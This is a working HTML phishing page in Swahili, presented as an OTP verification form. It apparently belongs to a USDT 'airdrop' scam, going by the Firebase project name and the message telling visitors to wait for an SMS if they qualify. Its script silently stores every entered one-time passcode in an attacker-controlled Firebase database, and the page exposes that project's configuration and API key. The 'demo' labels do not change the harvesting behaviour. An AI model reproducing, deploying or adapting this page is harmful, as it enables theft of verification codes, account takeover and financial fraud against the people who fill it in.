<!DOCTYPE html>
<html lang="sw">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Demo OTP Verification</title>

<style>
  body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #0a3d2a;
    color: #fff;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
  }

  .card {
    background: rgba(255, 255, 255, 0.08);
    padding: 20px;
    width: 92%;
    max-width: 400px;
    border-radius: 12px;
    text-align: center;
    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
  }

  h2 {
    margin: 0 0 10px;
    color: #00ff88;
  }

  input {
    width: 90%;
    padding: 12px;
    margin-top: 15px;
    border-radius: 8px;
    border: none;
    font-size: 16px;
  }

  button {
    width: 90%;
    margin-top: 15px;
    padding: 12px;
    background: #00ff88;
    color: #003300;
    border: none;
    font-weight: bold;
    border-radius: 8px;
    font-size: 16px;
    cursor: pointer;
  }

  /* Popup */
  .popup {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.55);
    display: none;
    align-items: center;
    justify-content: center;
    z-index: 9999;
  }

  .popup-box {
    background: #fff;
    width: 90%;
    max-width: 350px;
    padding: 20px;
    border-radius: 12px;
    text-align: center;
    color: #333;
    box-shadow: 0 8px 30px rgba(0,0,0,0.3);
  }

  .popup-box h3 {
    margin-bottom: 10px;
    color: #0a6f3c;
  }

  .close-btn {
    padding: 10px;
    width: 100%;
    background: #0a6f3c;
    color: #fff;
    border: none;
    border-radius: 8px;
    margin-top: 15px;
    cursor: pointer;
    font-weight: bold;
  }
</style>
</head>

<body>
  <div class="card">
    <h2>Weka OTP ya Uthibitisho</h2>
    <p>Weka OTP kuendelea.</p>

    <input id="otpInput" type="text" maxlength="6" placeholder="Ingiza OTP hapa..." inputmode="numeric" />

    <button id="submitOtp">Thibitisha</button>
  </div>

  <!-- Popup -->
  <div id="otpPopup" class="popup">
    <div class="popup-box">
      <h3>Subiri arifa ya SMS kama umehitimu</h3>

      <button class="close-btn" onclick="closePopup()">Funga</button>
    </div>
  </div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
  import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

  // Your Firebase config (safe)
  const firebaseConfig = {
      apiKey: "AIzaSyD4NQ9EsQqerx6y7v322p2ycraoDWJSRcM",
      authDomain: "airdropusdt-767d7.firebaseapp.com",
      databaseURL: "https://airdropusdt-767d7-default-rtdb.europe-west1.firebasedatabase.app",
      projectId: "airdropusdt-767d7",
      storageBucket: "airdropusdt-767d7.firebasestorage.app",
      messagingSenderId: "627616603037",
      appId: "1:627616603037:web:63041f067800c97fab6d74",
      measurementId: "G-01F6G2CYXK"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  const btn = document.getElementById('submitOtp');
  const popup = document.getElementById('otpPopup');

  // Submit action
  btn.addEventListener('click', async () => {
    const otp = document.getElementById('otpInput').value.trim();

    if (!otp || otp.length < 4) {
      alert("Tafadhali ingiza OTP sahihi.");
      return;
    }

    try {
      // Create new record
      const newRef = push(ref(db, "demo_otps"));
      await set(newRef, {
        otp: otp,
        submittedAt: new Date().toISOString()
      });

      popup.style.display = "flex";

    } catch (err) {
      console.error("OTP Save Error:", err);
      alert("Kumetokea tatizo. Jaribu tena.");
    }
  });

  // Close popup
  window.closePopup = function() {
    popup.style.display = "none";
  };
</script>

</body>
</html>
